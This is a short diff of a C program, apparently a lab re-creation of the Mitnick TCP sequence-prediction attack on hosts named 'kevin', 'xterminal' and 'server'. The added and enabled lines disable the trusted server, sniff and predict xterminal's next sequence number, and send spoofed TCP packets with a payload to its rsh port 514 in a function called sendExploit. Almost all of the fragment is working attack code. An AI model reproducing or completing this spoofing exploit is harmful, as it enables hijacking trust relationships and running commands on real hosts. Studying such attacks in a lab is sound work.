@@ -78,14 +78,12 @@ int main(int argc, char **argv)
     fflush(stdout);
     disableServer(l,sniffip,server);
     
-    /*
+    libnet_clear_packet(l);
     //Create the pscket sniffer
     pcap_t *des=packetSnifferInitialize();
-   // double tta= timeToAnswer(l,kevin,xterminal,514,514,des);
-   // printf("tta: %f",tta);
-    //Retrieve the next sequence of xterminal
-    uint32_t next=getNextSeq(l,kevin,xterminal,513,514,des);
 
+    uint32_t next=getNextSeq(l,kevin,xterminal,513,514,des);
+    libnet_clear_packet(l);
     printf("\nNext: %u",next);
     fflush(stdout);
     if (clean==0)
@@ -101,7 +99,7 @@ int main(int argc, char **argv)
     }
     
     usleep(1000);
-
+    libnet_clear_packet(l);
     //RESTORE THE SERVER*/
     printf("\n Enabling the server...");
     fflush(stdout);
@@ -121,6 +119,8 @@ void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_lon
         ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)0);
         sendPacket(l);
         sleep(1);
+        libnet_clear_packet(l);
+
 //ACK
         tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)1235,next+1,(char*)payload,plen, (u_int8_t)TH_ACK | TH_PUSH);
         ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)plen);
